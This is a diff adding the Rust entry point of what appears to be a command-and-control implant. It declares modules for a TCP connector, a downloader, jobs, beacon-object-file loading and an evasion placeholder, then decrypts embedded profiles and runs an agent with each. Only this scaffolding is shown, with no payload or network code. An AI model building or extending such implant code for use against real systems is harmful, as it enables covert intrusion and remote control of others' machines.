@@ -1,0 +1,33 @@
+mod config;
+mod crypto;
+mod protocol;
+mod agent;
+mod commander;
+mod connector_tcp;
+mod jobs;
+mod downloader;
+mod bof;
+// __EVASION_MOD__
+
+fn main() {
+    for blob in config::ENC_PROFILES {
+        if blob.len() <= crypto::KEY_SIZE {
+            continue;
+        }
+
+        let key = blob[..crypto::KEY_SIZE].to_vec();
+        let profile_bytes = match crypto::decrypt(&blob[crypto::KEY_SIZE..], &key) {
+            Ok(bytes) => bytes,
+            Err(_) => continue,
+        };
+
+        let profile: protocol::Profile = match protocol::unmarshal(&profile_bytes) {
+            Ok(profile) => profile,
+            Err(_) => continue,
+        };
+
+        let mut instance = agent::Agent::new(profile);
+        instance.session_key = key;
+        instance.run();
+    }
+}
